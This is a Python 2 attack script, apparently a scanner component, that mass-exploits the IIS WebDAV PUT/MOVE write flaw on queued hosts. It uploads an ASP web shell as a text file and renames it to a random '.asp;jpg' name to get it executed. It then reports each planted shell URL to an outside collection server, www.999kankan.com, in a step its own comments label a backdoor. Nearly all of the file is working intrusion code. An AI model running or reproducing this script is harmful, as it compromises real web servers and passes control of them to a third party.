#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#iis 写入漏洞   IIS  webdav
#神龙 QQ29295842
#blog http://hi.baidu.com/alalmn
import httplib
import socket
import random  #产生随机数
import string
import threading
import time
import Sip  #从中去读 host_port_80
import urllib2

class IIS(threading.Thread):
    def __init__(self,host_port_80):
        threading.Thread.__init__(self)
        self.host_port_80=host_port_80

    def run(self):
        try:
#            self.IIS_webdav("192.168.1.111")
            if self.host_port_80.empty():   #判断队列是否为空
                #print "-IIS--data host_port_80  null"
                time.sleep(20)
                self.run()
            print u"=========host_port_80-------%s========="%(self.host_port_80.qsize())
            self.Chost = self.host_port_80.get(0.5)  #get()方法从队头删除并返回一个项目
            if self.Chost=="":
                time.sleep(20)
                self.run()
            #print "CS %s IIS_webdav ks....."%(self.Chost)
            self.IIS_webdav(self.Chost)
            #print "close IIS_webdav!!!!!"

            time.sleep(1)
            self.run()
        except:
            print "-IIS-run-try--except!!!!!"

    def url_post(self,URL):
        try:
            req = urllib2.Request(URL)
            req.add_header('User-Agent',"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
            urllib2.urlopen(req,timeout=20)  # 超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
            #urllib2.urlopen(URL,timeout=20)  # 后门POST提交   超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
            time.sleep(1)
        except:
            return 0
    #############################################################################
    def TXT_file(self,data):  #写入文本
        try:
            file_nem=time.strftime('%Y.%m.%d')
            file_object = open(file_nem+"IIS_webdav.txt",'a')
            #file_object.write(list_passwed[E])
            file_object.writelines("\r\n")
            file_object.writelines(data)
            file_object.close()
        except:
            print "-IIS---TXT_file-try--except!!!!!"
            return 0

    def IIS_webdav(self,url,port=80):  #iis 写入漏洞   IIS  webdav
        try:
            PUT_txt="/test.txt"
            #MOVE_asp="/shell.asp"
            #ip=socket.gethostbyname(url)  #将玉米转换成IP
            data="OPTIONS / HTTP/1.1\nHost:%s\r\n\r\n"%(url)  #OPTIONS返回服务器的各种信息
            OPTIONS=self.socket_sendall(url,port,data)
            #print OPTIONS
            if 'PUT' in OPTIONS and 'Microsoft-IIS/' in OPTIONS: #查看是否有PUT MOVE  和是否是Microsoft-IIS
                #print "IIS_webdav--Host:%s open  Microsoft-IIS"%(url)
                with open("80sec.asp") as f:  #马
                    data=f.read()
                data="PUT %s HTTP/1.1\nHost:%s\nContent-Length:%s\r\n\r\n%s\r\n\r\n"%(PUT_txt,url,len(data)+1,data)
                PUT=self.socket_sendall(url,port,data)
                if "http://"+url+PUT_txt in PUT:
                    #print "IIS_webdav--Host:%s open  PUT"%(url)

                    da="IIS_webdav--IIS_PUT  OK  http://"+url+PUT_txt
                    self.TXT_file(da)  #写入文本
                    print da
                    MOVE_asp="/"
                    MOVE_asp+=self.sjzf() #随机文件名
                    MOVE_asp+=".asp;jpg"
                    data="MOVE %s HTTP/1.1\nHost:%s\nDestination:%s\r\n\r\n"%\
                         (PUT_txt,url,"http://"+url+MOVE_asp)
                    MOVE=self.socket_sendall(url,port,data)
                    if "http://"+url+MOVE_asp in MOVE:
                        print "IIS_webdav--Host:%s open  MOVE"%("http://"+url+MOVE_asp)
                        #if self.http_get(url,MOVE_asp):  #验证地址是否存在
                        da="IIS_webdav--IIS_MOVE  OK  http://"+url+MOVE_asp
                        print da
                        URL="http://www.999kankan.com/IIS_webdav.php?URL=%s"%("http://"+url+MOVE_asp)
                        self.url_post(URL)   #后门
                        self.TXT_file(da)  #写入文本
                        #可以以数组的形式添加到消息队列  在存库
                        #["wwww.xxx.com","IIS_webdav","http://XXXX","备注"]
            return 0
        except:
            print "-IIS-IIS_webdav-try--except!!!!!"
            return 0

    def socket_sendall(self,IP,port,message):
        try:
            S=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            S.connect((IP,port))
           # message="MOVE/123.txt HTTP/1.1\r\nHOST:192.168.1.111\r\nDestination:http://192.168.1.111/123.asp\r\n\r\n"
            S.sendall(message)
            return S.recv(1024)
        except:
            print "-IIS-socket_sendall-try--except!!!!!"
            return 0

    def sjzf(self):  #产生一个随机字符
        sj=random.randint(5,10)
        return string.join(random.sample(['z','y','x','w','v','u','t','s','r','q','p','o','n','m','l','k','j','i','h','g','f','e','d','c','b','a'], sj)).replace(' ','')

    def http_get(self,host,admin):  #验证地址是否存在
        #print host+"----"+admin
        try:
            connection = httplib.HTTPConnection(host,80,timeout=10)
            connection.request("GET",admin)
            response = connection.getresponse()
            if response.status==200:  #只能显示单个文件    不能显示文件夹
                #SQLdata="http://"+host+admin+"    %s %s"%(response.status, response.reason)
                #print SQLdata
                return 1
            return 0
        except:
            #print u"URL_http线程%d   验证地址异常"%(self.Ht)
            return 0

    #############################################################################

################################################
if __name__=='__main__':
    Sip.host_port_80.put("http://192.168.1.111/onxafclqu.asp",0.3) #
    threads = []  #线程
    for i in range(1):  #nthreads=10  创建10个线程
        threads.append(IIS(Sip.host_port_80))

    for t in threads:   
        t.start()  #start就是开始线程






